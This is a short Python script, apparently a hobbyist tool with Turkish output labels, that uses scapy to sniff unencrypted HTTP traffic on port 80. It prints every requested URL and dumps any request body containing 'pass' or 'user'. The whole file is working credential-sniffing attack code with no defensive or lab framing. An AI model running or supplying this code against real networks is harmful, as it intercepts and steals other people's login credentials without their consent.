from scapy.all import *

print("--- PACKET SNIFFER (HTTP) ---")

def packet_callback(packet):
    if packet.haslayer(HTTPRequest):
        url = packet[HTTPRequest].Host.decode() + packet[HTTPRequest].Path.decode()
        print(f"🌎 SİTE: {url}")
        
        if packet.haslayer(Raw):
            load = packet[Raw].load.decode(errors='ignore')
            if "pass" in load or "user" in load:
                print(f"🔥 VERİ: {load}")

sniff(filter="port 80", prn=packet_callback, store=False)